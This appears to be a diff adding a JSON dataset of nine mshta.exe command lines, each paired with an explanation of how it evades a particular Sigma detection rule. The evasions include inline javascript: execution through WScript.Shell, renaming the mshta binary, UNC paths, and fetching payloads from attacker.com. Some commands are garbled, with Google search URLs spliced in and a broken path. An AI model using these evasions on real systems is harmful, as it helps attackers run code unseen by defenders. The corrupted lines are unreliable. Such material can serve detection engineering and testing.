@@ -1,0 +1,38 @@
+[
+  {
+    "output": "mshta.exe \"javascript:new%20ActiveXObject('WScript.Shell').Run('calc.exe');window.close();\"",
+    "explanation": "This bypasses the rule by using an inline JavaScript protocol handler rather than a file path. The Sigma rule specifically looks for suspicious file extensions (e.g., .png, .zip, .txt) in the CommandLine. By executing the logic directly in the CLI via 'javascript:', no blacklisted extension is present."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\mshta.exe C:\\Users\\Public\\Update.com && C:\\Users\\Public\\Update.com [http://attacker.com/payload](https://www.google.com/search?q=http://attacker.com/payload)",
+    "explanation": "This bypass relies on the 'selection_img' logic. While the rule checks for OriginalFileName, some SIEM configurations primarily index the 'Image' (path) field. By renaming the binary to a non-suspicious extension like .com or .scr, it may evade filters that prioritize path-based detection over metadata, and it avoids the command-line extension blacklist by pointing to a URL."
+  },
+  {
+    "output": "mshta.exe \"C:\\Users\\Public\\script.hta\"",
+    "explanation": "The rule is specifically designed to catch polyglots (HTA code hidden in non-HTA extensions). It does not include the standard '.hta' extension in its 'selection_cli' list to avoid false positives. Using the intended extension for the tool remains a viable path for execution if the SOC does not have a baseline for authorized HTA files."
+  },
+  {
+    "output": "mshta.exe \"\\\\127.0.0.1\\c$\\Users\\Public\\payload.hta\"",
+    "explanation": "Using a UNC path to point to a file without any of the blacklisted extensions (like .png or .jpg) bypasses the 'selection_cli' filter while still allowing the execution of remote or local malicious HTA content."
+  },
+  {
+    "output": "mshta.exe http://example.com/payload.html",
+    "explanation": "The rule explicitly omits standard web extensions like '.html' or '.hta' to prevent false positives. An attacker can host malicious VBScript/JScript within a standard HTML file format to execute code without triggering the listed suspicious extensions."
+  },
+  {
+    "output": "mshta.exe javascript:\"\\<script\\>dw=new%20ActiveXObject('WScript.Shell');dw.Run('calc.exe');close();\\</script\\>\"",
+    "explanation": "The rule specifically looks for suspicious file extensions (like .png, .pdf, .zip) or the keyword 'vbscript' in the command line. By using the 'javascript:' protocol handler directly in the command line to execute code, the suspicious file extensions are avoided entirely, bypassing the 'selection\\_cli' criteria."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\mshta.exe C:\\Users\\Public\\\not\\_https://www.google.com/search?q=hta.com && C:\\Users\\Public\\\not\\_https://www.google.com/search?q=hta.com http://attacker.com/payload.png",
+    "explanation": "The rule relies on 'Image|endswith' or 'OriginalFileName' being 'mshta.exe'. If an attacker copies mshta.exe to a new filename with a different extension (like .com or .scr) and executes it, some EDRs/logging sources may not correctly populate the OriginalFileName field, or the detection might only be looking at the 'Image' path, which no longer ends in 'mshta.exe'."
+  },
+  {
+    "output": "mshta.exe \"http://attacker.com/payload\"",
+    "explanation": "The rule filters for specific extensions. By hosting the HTA content on a web server and referencing it via a URL that does not include a file extension (e.g., using a REST endpoint or a directory index that serves HTA content), the command line will not contain any of the blacklisted strings in 'selection\\_cli'."
+  },
+  {
+    "output": "mshta.exe \"C:\\Users\\Public\\payload.hta\"",
+    "explanation": "The rule is designed to find polyglots and obfuscated extensions. It explicitly does not alert on the standard '.hta' extension to avoid false positives. An attacker can simply use the intended extension for the tool, even if the content inside is malicious, to remain under the radar of this specific detection logic."
+  }
+]
